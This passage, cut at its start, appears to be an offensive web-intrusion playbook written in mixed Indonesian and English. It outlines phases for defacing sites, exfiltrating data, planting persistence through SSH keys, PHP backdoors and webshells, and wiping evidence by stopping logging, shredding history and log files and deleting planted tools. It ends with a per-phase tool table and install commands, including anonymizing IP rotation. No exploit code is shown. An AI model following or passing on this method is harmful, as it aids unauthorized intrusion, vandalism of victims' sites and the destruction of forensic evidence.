│  • Upload deface │   │  • HTTPS POST    │   │  • SSH key       │
│  • Mass deface   │   │  • ICMP tunnel   │   │  • PHP backdoor  │
│  • WP/WebDAV     │   │  • Cloud upload  │   │  • Webshell path │
└──────────────────┘   └──────────────────┘   └──────────────────┘
         ↓                         ↓                         ↓
┌─────────────────────────────────────────────────────────────────┐
│              PHASE 6: STEALTH / LOG CLEANING                    │
│  • Stop rsyslog / journald                                      │
│  • Bind mount /dev/null to log files                            │
│  • Shred .bash_history, access logs, wtmp, btmp                 │
│  • Hapus tools & webshell (shred + rm)                          │
│  • Delete SSH user & keys                                       │
│  • Restore logging system                                       │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ TOOLS QUICK REFERENCE

### Per Phase

| Phase | Tools |
|-------|-------|
| **Passive Recon** | `dnsrecon`, `whois`, `dig`, `shodan`, `censys`, `gitdorker`, `searchsploit` |
| **Active Recon** | `masscan`, `nmap`, `whatweb`, `ffuf`, `gobuster`, `nuclei`, `wafw00f`, `arjun` |
| **Exploit** | `sqlmap`, `commix`, `metasploit`, `weevely`, `phpggc`, `ysoserial`, `tplmap`, `burpsuite` |
| **Post-Exploit** | `mysql`, `psql`, `sqlcmd`, `ssh`, `netcat`, `socat`, `chisel`, `ligolo-ng` |
| **Deface** | `white-deface`, `defacer`, `havtest`, `curl`, `weevely` |
| **Stealth** | `shred`, `sed`, `mount`, `systemctl`, `cat /dev/null` |
| **Exfiltrate** | `curl`, `nc`, `nslookup`, `ping`, `openssl`, `base64` |
| **IP Rotation** | `proxychains4`, `mubeng`, `anonsurf`, `rota`, `tor` |
| **Persistence** | `crontab`, `ssh-keygen`, `echo >>`, `useradd` |

### Install Commands

```bash
# WAJIB — IP Rotation
sudo apt install proxychains4 tor
go install github.com/kitabisa/mubeng@latest

# WAJIB — Exploit
sudo apt install sqlmap metasploit-framework weevely searchsploit
pip install sqlmap commix

# Recomended
sudo apt install nmap masscan whatweb ffuf gobuster nuclei wafw00f
```

